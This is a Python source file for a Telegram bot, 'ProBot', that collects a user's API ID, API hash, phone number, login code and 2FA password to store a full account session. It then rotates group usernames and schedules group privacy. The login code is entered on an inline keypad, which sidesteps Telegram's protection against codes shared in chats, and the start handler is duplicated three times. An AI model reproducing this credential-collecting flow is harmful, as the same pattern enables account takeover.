# bot.py (Final Full Version with Inline OTP Keyboard and All Features)

from aiogram import Bot, Dispatcher, types
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils import executor
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup

from config import BOT_TOKEN
from session_manager import send_otp_code, confirm_otp_code, confirm_2fa_password
from username_changer import start_username_changer, stop_username_changer
from group_privater import schedule_group_privacy
from status import get_status_message
from states import LoginState
from db import init_db

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)
init_db()

# OTP keyboard cache
otp_cache = {}

def generate_otp_keyboard(entered: str = ""):
    keyboard = []
    display_text = f"🔢 OTP: {entered or '____'}"
    keyboard.append([InlineKeyboardButton(display_text, callback_data="noop")])

    for row in [["1", "2", "3"], ["4", "5", "6"], ["7", "8", "9"]]:
        keyboard.append([
            InlineKeyboardButton(d, callback_data=f"digit_{d}") for d in row
        ])
    keyboard.append([
        InlineKeyboardButton("0", callback_data="digit_0"),
        InlineKeyboardButton("⌫", callback_data="del"),
        InlineKeyboardButton("✅ Confirm", callback_data="submit")
    ])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)


# ✅ Sahi:
from db import get_session

@dp.message_handler(commands=['start'])
async def start_cmd(msg: types.Message, state: FSMContext):
    existing_session = get_session(msg.from_user.id)
    if existing_session:
        await msg.answer("✅ You're already logged in. Session is active.")
        return
    await msg.answer("👋 Welcome to ProBot!\n\nPlease enter your **API ID**:")
    await LoginState.waiting_for_api_id.set()
@dp.message_handler(commands=['start'])
async def start_cmd(msg: types.Message, state: FSMContext):
    existing_session = get_session(msg.from_user.id)
    if existing_session:
        await msg.answer("✅ You're already logged in. Session is active.")
        return  # Skip login process

    await msg.answer("👋 Welcome to ProBot!\n\nPlease enter your **API ID**:")
    await LoginState.waiting_for_api_id.set()

async def start_cmd(msg: types.Message, state: FSMContext):
    await msg.answer("👋 Welcome to ProBot!\n\nPlease enter your **API ID**:")
    await LoginState.waiting_for_api_id.set()

@dp.message_handler(state=LoginState.waiting_for_api_id)
async def get_api_id(msg: types.Message, state: FSMContext):
    await state.update_data(api_id=msg.text.strip())
    await msg.answer("✅ API ID saved.\nNow enter your **API HASH**:")
    await LoginState.waiting_for_api_hash.set()

@dp.message_handler(state=LoginState.waiting_for_api_hash)
async def get_api_hash(msg: types.Message, state: FSMContext):
    await state.update_data(api_hash=msg.text.strip())
    await msg.answer("📱 Now enter your **phone number** with country code:\nExample: `+919876543210`")
    await LoginState.waiting_for_phone.set()

@dp.message_handler(state=LoginState.waiting_for_phone)
async def get_phone(msg: types.Message, state: FSMContext):
    await state.update_data(phone=msg.text.strip())
    await msg.answer("📤 Sending OTP to your Telegram...")
    data = await state.get_data()
    sent = await send_otp_code(
        user_id=msg.from_user.id,
        api_id=data['api_id'],
        api_hash=data['api_hash'],
        phone=data['phone']
    )
    if sent:
        otp_cache[msg.from_user.id] = []
        await msg.answer("🔢 OTP sent! Use the inline buttons to enter:", reply_markup=generate_otp_keyboard())
        await LoginState.waiting_for_otp.set()
    else:
        await msg.answer("❌ Failed to send OTP. Try again.")
        await state.finish()

@dp.message_handler(state=LoginState.waiting_for_otp)
async def otp_msg_blocker(msg: types.Message):
    await msg.answer("❗ Please use the buttons below to enter your OTP.")

@dp.callback_query_handler(lambda c: c.data.startswith(("digit_", "del", "submit")), state=LoginState.waiting_for_otp)
async def handle_otp_buttons(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    data = callback.data
    otp_digits = otp_cache.get(user_id, [])

    if data.startswith("digit_"):
        digit = data.split("_")[1]
        if len(otp_digits) < 6:
            otp_digits.append(digit)
    elif data == "del":
        if otp_digits:
            otp_digits.pop()
    elif data == "submit":
        code = "".join(otp_digits)
        await callback.message.edit_text("🧠 Verifying OTP...")
        result = await confirm_otp_code(user_id, code, state, bot)
        return

    otp_cache[user_id] = otp_digits
    await callback.message.edit_reply_markup(reply_markup=generate_otp_keyboard("".join(otp_digits)))
    await callback.answer()

@dp.message_handler(state=LoginState.waiting_for_2fa)
async def get_2fa_password(msg: types.Message, state: FSMContext):
    user_id = msg.from_user.id
    password = msg.text.strip()
    await msg.answer("🔐 Verifying 2FA password...")
    result = await confirm_2fa_password(user_id, password, state, bot)
    if result:
        await msg.answer("✅ 2FA Verified & Session Saved!")
    else:
        await msg.answer("❌ Incorrect password or error occurred.")

@dp.message_handler(commands=['start_change'])
async def start_changing_username(msg: types.Message, state: FSMContext):
    await msg.reply("📛 Send your group @username (without @):")
    await state.set_state("group_username")

@dp.message_handler(state="group_username")
async def get_group_username(msg: types.Message, state: FSMContext):
    await state.update_data(group_username=msg.text.strip())
    await msg.reply("✏️ Now send the list of usernames to rotate, separated by commas:")
    await state.set_state("usernames_list")

@dp.message_handler(state="usernames_list")
async def get_username_list(msg: types.Message, state: FSMContext):
    usernames = [u.strip() for u in msg.text.strip().split(",")]
    await state.update_data(usernames=usernames)
    await msg.reply("⏱️ Now send the interval time (in seconds):")
    await state.set_state("change_interval")

@dp.message_handler(state="change_interval")
async def get_interval_and_start(msg: types.Message, state: FSMContext):
    try:
        interval = int(msg.text.strip())
        data = await state.get_data()
        result = await start_username_changer(
            user_id=msg.from_user.id,
            group_username=data['group_username'],
            usernames=data['usernames'],
            interval=interval
        )
        await msg.reply(result)
    except Exception as e:
        await msg.reply(f"❌ Error: {e}")
    finally:
        await state.finish()

@dp.message_handler(commands=['stop_change'])
async def stop_change_handler(msg: types.Message):
    result = await stop_username_changer(msg.from_user.id)
    await msg.reply(result)

@dp.message_handler(commands=['status'])
async def check_status(msg: types.Message):
    user_id = msg.from_user.id
    status_text, keyboard = get_status_message(user_id)
    await msg.reply(status_text, reply_markup=keyboard, parse_mode="Markdown")

@dp.callback_query_handler(lambda c: c.data == "stop_changer")
async def handle_stop_button(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    result = await stop_username_changer(user_id)
    await callback.message.edit_text(result)
    await callback.answer("🛑 Stopped.")

class PrivateState:
    waiting_for_group = "private_group"
    waiting_for_start = "private_start"
    waiting_for_end = "private_end"
    waiting_for_repeat = "private_repeat"

@dp.message_handler(commands=['private'])
async def start_private(msg: types.Message, state: FSMContext):
    await state.set_state(PrivateState.waiting_for_group)
    await msg.reply("📛 Enter your group @username (without @):")

@dp.message_handler(state=PrivateState.waiting_for_group)
async def private_get_group(msg: types.Message, state: FSMContext):
    await state.update_data(group=msg.text.strip())
    await state.set_state(PrivateState.waiting_for_start)
    await msg.reply("🕛 Enter START time in 24hr format (HH:MM), e.g., 00:00")

@dp.message_handler(state=PrivateState.waiting_for_start)
async def private_get_start(msg: types.Message, state: FSMContext):
    await state.update_data(start=msg.text.strip())
    await state.set_state(PrivateState.waiting_for_end)
    await msg.reply("🕓 Enter END time in 24hr format (HH:MM), e.g., 04:00")

@dp.message_handler(state=PrivateState.waiting_for_end)
async def private_get_end(msg: types.Message, state: FSMContext):
    await state.update_data(end=msg.text.strip())
    await state.set_state(PrivateState.waiting_for_repeat)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("🔁 Yes, Repeat Daily", callback_data="repeat_yes")],
        [InlineKeyboardButton("❌ No, Only Once", callback_data="repeat_no")]
    ])
    await msg.reply("🔁 Do you want this to repeat daily?", reply_markup=keyboard)

@dp.callback_query_handler(lambda c: c.data.startswith("repeat_"), state=PrivateState.waiting_for_repeat)
async def private_repeat_decision(callback: types.CallbackQuery, state: FSMContext):
    repeat = callback.data == "repeat_yes"
    data = await state.get_data()
    result = await schedule_group_privacy(
        user_id=callback.from_user.id,
        group_username=data['group'],
        start_time_str=data['start'],
        end_time_str=data['end'],
        repeat=repeat
    )
    await callback.message.edit_text(result)
    await callback.answer("✅ Scheduled")
    await state.finish()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
    